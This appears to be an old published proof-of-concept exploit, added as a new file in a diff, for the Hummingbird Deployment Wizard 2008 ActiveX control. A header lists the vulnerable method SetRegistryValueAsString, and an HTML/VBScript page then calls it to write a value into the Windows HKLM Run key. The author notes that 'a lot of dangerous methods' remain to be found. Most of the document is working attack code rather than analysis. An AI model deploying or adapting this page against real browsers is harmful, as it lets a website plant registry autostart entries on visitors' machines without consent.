@@ -1,0 +1,40 @@
+------------------------------------------------------------------------------------
+ Hummingbird Deployment Wizard 2008 (DeployRun.dll) Registry Values Creation/Change
+ url: http://www.hummingbird.com
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://www.shinnai.net
+
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+ 
+ Info:
+ DeployRun.dll <= 10.0.0.44
+ 
+ Marked as:
+ RegKey Safe for Script: False
+ RegKey Safe for Init: False
+ Implements IObjectSafety: True
+ IDisp Safe:  Safe for untrusted: caller,data  
+ IPersist Safe:  Safe for untrusted: caller,data
+
+ Vulnerable method:
+ Sub SetRegistryValueAsString (ByVal Path As String, ByVal v As String)
+
+ Tested on Windows XP Professional SP3 full patched, with Internet Explorer 7
+
+ There are a lot of dangerous methods, just take a look and... good searching
+------------------------------------------------------------------------------------
+<object classid='clsid:7F9B30F1-5129-4F5C-A76C-CE264A6C7D10' id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value='Click here to start the test'>
+
+<script language='vbscript'>
+ Sub tryMe
+  'test.SetRegistryValueAsString "Existing Registry Path + Existing Registry Key", "Value to change"
+  test.SetRegistryValueAsString "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\YourFavouriteKey", "Hello World!"
+ End Sub
+</script>
+
+# milw0rm.com [2008-10-17]
